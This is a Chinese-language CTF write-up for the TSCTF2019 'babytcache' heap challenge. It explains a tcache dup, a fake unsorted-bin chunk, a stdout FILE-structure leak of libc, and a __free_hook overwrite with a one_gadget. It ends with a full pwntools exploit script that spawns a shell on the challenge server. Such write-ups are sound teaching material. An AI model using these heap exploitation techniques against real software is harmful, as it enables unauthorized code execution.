---
title: babytcache
categories:
- TSCTF2019
---
# tsctf2019->babytcache 

## 程序逻辑

这道题是pwnable里tcache_tear改编来的，程序只有Alloc和Delete功能，没有泄露地址的函数，这里要考虑用文件结构体来泄露，具体可以参考hitcon的babytcache和bctf的three和前两天信安竞赛的bms

![init](./3.jpg)

![main](./1.jpg)

![Alloc](./2.jpg)

## 漏洞利用

### 泄露地址

Init里用mmap分配了一块内存，查一下prot是可读可写，mmap分配成功即返回target_addr，因此第一次read调用的是read(0,0xabcda000,0x200)，根据原题的思路，我们可以在这个地址范围内构造一个fake_chunk，其size为0x100，在它的next_chunk处修改其size为0x21，使得prev_in_use为1，通过tcache dup可以Malloc到这个地址，再free(0xabcda010)，由于之前已经两次Free这个地址了,count对应位置被置为0，free的时候直接减1变成0xff>7，意味着tcache bin被填满，不再放入Tcache而是small bin，成为unsorted bin。

![leak](./4.jpg)

使用tcache dup，从unsorted bin中分配0x90再double free，这时候unsored bin被切割成两部分，由于剩下的部分size依然满足unsorted bin要求，新的unsorted bin为0xabcda0a0。其fd和bk写入了main_arena+88，double free的结果是0x90被放入了tcache entry。

分配一个chunk，使得tcahe的next被改成0xabcda0b0，tcache_entry链上增加了0xabcda0b0。

Alloc(0x40)分配的是Unsorted bin，其fd被覆写了2个低字节，注意此时这个chunk也在tcache_entry里，相当于next指针被修改了。

All(0x90)分配的chunk为0xabcda000，Alloc(0x90)再分配的chunk为0xabcda0a0，再Alloc(0x90)分配的就是之前爆破的fake_addr，这里修改为p64(0xfbad1800)+p64(0)*3+'\x00'，造成泄露，调试过程中查看这个地址与libc_base的距离，记为offset，这个偏移是固定的，之后得到的地址减去offset即可得到libc_base
```py
Alloc(0x90,p64(0xabcda0b0))
Alloc(0x40,'\x60\x67')#0xabcda0b0 => chunk extend with 0xabcda100 overwrite last 2 bytes
Alloc(0x90,"c\n")#chunk addr => 0xabcda000
Alloc(0x90,"d\n")#chunk addr => 0xabcda0a0
payload = p64(0xfbad1800)+p64(0)*3+'\x00'
Alloc(0x90,payload)
```

### get shell

使用one_gadget得到Libc的gadgets，覆写free_hook为one_gadget的地址，分配一个chunk，其内容为'/bin/sh\x00'。Free(chunk_addr)即可调用system('/bin/sh\x00')

## exp.py

```py
#coding=utf-8
from pwn import *
debug = 0
context.update(arch='amd64',os='linux',log_level="info")
context.terminal = ['tmux','split','-h']
elf = ELF('./main')
if debug:
    p = process('./main')
    #p = process(["./main"],env={"LD_PRELOAD":'./libc-2.27.so'})
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('10.112.100.47',2333)
    libc = ELF('./libc-2.27.so')

def Alloc(size,data):
    p.recvuntil('Please input your choice:')
    p.sendline('1')
    p.recvuntil('input size:')
    p.sendline(str(size))
    p.recvuntil('input data:')
    p.send(data)

def Delete():
    p.recvuntil('Please input your choice:')
    p.sendline('2')

def Init():
    p.recvuntil('input your secret:')
    payload = p64(0) + p64(0x101) + 'a'*0xf0
    #next chunk prev_in_use must be *1
    payload += p64(0x0) + p64(0x21) + 'b'*0x10 + p64(0x20) + p64(0x21)
    p.sendline(payload)

def exp():
    gadgets = [0x4f2c5,0x4f322,0x10a38c]
    Init()
    #malloc unsorted bin
    Alloc(0xf0,'a\n')
    Delete() 
    Delete() 
    Alloc(0xf0,p64(0xabcda010))
    Alloc(0xf0,'a\n')
    Alloc(0xf0,'b\n')
    Delete() 
    #unsorted bin => 0xabcda000
    #tcache dup to malloc unsorted bin
    #gdb.attach(p)
    Alloc(0x90,'a\n')#malloced from unsorted bin => new unsorted bin:0xabcda0a0
    #tcache 
    Delete() 
    Delete() 
    #(0xa0)   tcache_entry[8]: 0xabcda010 --> 0xabcda010 (overlap chunk with 0xabcda000(freed) )
    Alloc(0x90,p64(0xabcda0b0))
    #(0xa0)   tcache_entry[8]: 0xabcda010 --> 0xabcda0b0 (overlap chunk with 0xabcda0a0(freed) )
    Alloc(0x40,'\x60\x67')#0xabcda0b0 => overwrite last 2 bytes
    #(0xa0)   tcache_entry[8]: 0xabcda010 --> 0xabcda0b0
    Alloc(0x90,'c\n')#chunk addr => 0xabcda000
    #(0xa0)   tcache_entry[8]: 0xabcda0b0
    Alloc(0x90,'d\n')#chunk addr => 0xabcda0a0
    #(0xa0)   tcache_entry[8]: 0x7ffff7dd6760
    payload = p64(0xfbad1800)+p64(0)*3+'\x00'
    Alloc(0x90,payload)
    p.recvn(8)
    #leak libc
    leaked_addr = u64(p.recvn(8))
    log.success('leaked addr => ' + hex(leaked_addr))
    libc_base = leaked_addr - 0x3ed8b0
    log.success('libc base => ' + hex(libc_base))
    free_hook = libc_base + libc.symbols["__free_hook"]
    shell_addr = libc_base + gadgets[1]
    #get shell
    Alloc(0x50,'xmzyshypnc')
    Delete() 
    Delete() 
    Alloc(0x50,p64(free_hook))
    Alloc(0x50,'/bin/sh\x00')
    Alloc(0x50,p64(shell_addr))
    Delete()
    p.interactive()

exp()


```


